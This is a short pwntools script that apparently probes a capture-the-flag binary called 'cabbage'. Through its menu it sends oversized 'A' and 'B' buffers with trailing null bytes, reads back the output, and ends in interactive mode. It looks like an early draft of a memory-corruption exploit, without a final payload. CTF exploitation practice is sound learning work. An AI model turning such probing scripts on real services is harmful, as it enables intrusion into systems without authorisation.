from pwn import *

exe = ELF('./cabbage')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

io.recvuntil(b'>')
io.sendline(b'2')
print(io.recvline())


io.recvuntil(b'>')
io.sendline(b'1')
io.sendline(b'A' * (0x1000 - 0x3) + b'\x00')

io.recvuntil(b'>')
io.sendline(b'2')
print(io.recvline())


io.recvuntil(b'>')
io.sendline(b'1')
io.sendline(b'B' * 0x10 + b'\x00' * 10)

io.recvuntil(b'>')
io.sendline(b'2')
print(io.recvline())
io.interactive()
